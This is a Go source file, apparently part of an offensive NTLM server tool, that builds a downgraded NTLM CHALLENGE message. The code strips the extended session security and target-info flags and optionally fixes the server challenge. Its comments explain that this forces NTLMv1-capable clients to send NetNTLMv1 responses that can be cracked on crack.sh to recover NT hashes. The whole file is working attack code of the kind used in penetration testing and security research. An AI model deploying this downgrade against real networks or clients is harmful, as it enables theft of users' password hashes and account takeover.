package server

import (
	"github.com/TheManticoreProject/Manticore/crypto/spnego/ntlm/message/challenge"
	"github.com/TheManticoreProject/Manticore/crypto/spnego/ntlm/message/negotiate"
	"github.com/TheManticoreProject/Manticore/crypto/spnego/ntlm/message/negotiate/flags"
	"github.com/TheManticoreProject/Manticore/crypto/spnego/ntlm/version"
)

// downgradeChallenge builds a CHALLENGE that advertises neither extended session
// security nor target info, so an NTLMv1-speaking client answers with a plain
// NetNTLMv1 response — DES of the NT hash over the server challenge directly.
// With a fixed challenge that response is crackable on crack.sh, which recovers
// the NT hash regardless of password strength. Manticore always asserts ESS when
// it emits a CHALLENGE, so the only way to strip it is to supply the whole
// message through the acceptor's ChallengeProvider seam.
//
// A client that computes NTLMv2 ignores the missing ESS and answers v2 anyway;
// the downgrade only changes what an NTLMv1-capable client produces.
func downgradeChallenge(negotiateBytes []byte, targetName string, fixed *[8]byte, advertiseVersion *version.Version) ([]byte, error) {
	neg := &negotiate.NegotiateMessage{}
	if _, err := neg.Unmarshal(negotiateBytes); err != nil {
		return nil, err
	}

	serverChallenge := [8]byte{}
	if fixed != nil {
		serverChallenge = *fixed
	} else {
		generated, err := challenge.NewServerChallenge()
		if err != nil {
			return nil, err
		}
		serverChallenge = generated
	}

	// A CHALLENGE carrying neither target name nor target info marshals to 56
	// bytes, which Manticore's own Unmarshal rejects as short (it expects the
	// >=60 a real server's target info produces). A target name pads it past that
	// without reintroducing extended session security, which the target-info
	// AV_PAIRs would. Fall back to a non-empty name so the message is always valid.
	if targetName == "" {
		targetName = "WORKGROUP"
	}

	msg, err := challenge.CreateChallengeMessage(neg, serverChallenge, targetName, challenge.TargetTypeDomain, nil, advertiseVersion)
	if err != nil {
		return nil, err
	}
	// CreateChallengeMessage keeps the ESS bit the client offered (the flags are
	// the intersection of client and acceptor). Strip it, and the target-info bit
	// that goes with it, to force the plain NTLMv1 computation.
	msg.NegotiateFlags &^= flags.NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY
	msg.NegotiateFlags &^= flags.NTLMSSP_NEGOTIATE_TARGET_INFO
	return msg.Marshal()
}
